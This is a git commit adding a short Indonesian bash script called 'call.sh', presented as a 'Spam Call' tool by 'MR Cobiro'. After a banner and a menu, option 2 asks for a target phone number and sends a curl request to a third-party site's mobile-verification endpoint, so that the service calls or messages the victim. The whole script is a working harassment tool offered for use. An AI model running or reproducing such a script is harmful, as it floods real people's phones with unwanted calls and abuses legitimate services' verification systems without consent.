916caae6d1f0b2163f5d67a606e408ef7b4bc749
Mr Cobiro <87790524+MRCOBIRO@users.noreply.github.com>
2021-07-22 20:04:14 +0700

    Add files via upload

---
+++ call.sh
@@ -0,0 +1,33 @@
+#!/bin/bash
+
+
+# tampilan
+clear
+figlet SPAM CALL | lolcat
+echo -e "=====================================================" | lolcat
+echo -e " Author : MR Cobiro" | lolcat
+echo -e " Team   : Mafia Teknologi Indonesia" | lolcat
+echo -e "=====================================================" | lolcat
+echo
+echo -e "[1]. Subscribe Author" | lolcat
+echo -e "[2]. Spam Call" | lolcat
+echo -e "[3]. Keluar" | lolcat
+read -p "pilih: " call
+
+if [ $call = 1 ]
+then
+    xdg-open https://youtube.com/channel/UC2F_TFPuynm51OYUmiLnz0g
+fi
+
+if [ $call = 2 ]
+then
+read -p "Masukan Nomor Target => " nomor;
+link="https://id.jagreward.com/member/verify-mobile/$nomor"
+curl -s $link
+fi
+
+if [ $call = 3 ]
+then
+echo "Terimah Kasih Salam MR Cobiro"
+    exit
+fi
